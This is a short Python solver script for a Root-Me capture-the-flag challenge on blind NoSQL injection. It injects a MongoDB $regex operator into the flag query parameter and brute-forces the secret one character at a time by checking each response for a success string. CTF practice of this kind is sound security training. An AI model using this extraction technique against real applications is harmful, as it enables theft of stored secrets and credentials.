#Adapted for NoSQL Injection - Blind Root-Me
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

chall_name='nosqlblind'
flag=''
u='http://challenge01.root-me.org/web-serveur/ch48/index.php'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?chall_name=%s&flag[$regex]=^%s' % (chall_name, flag + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (flag+c))
        flag += c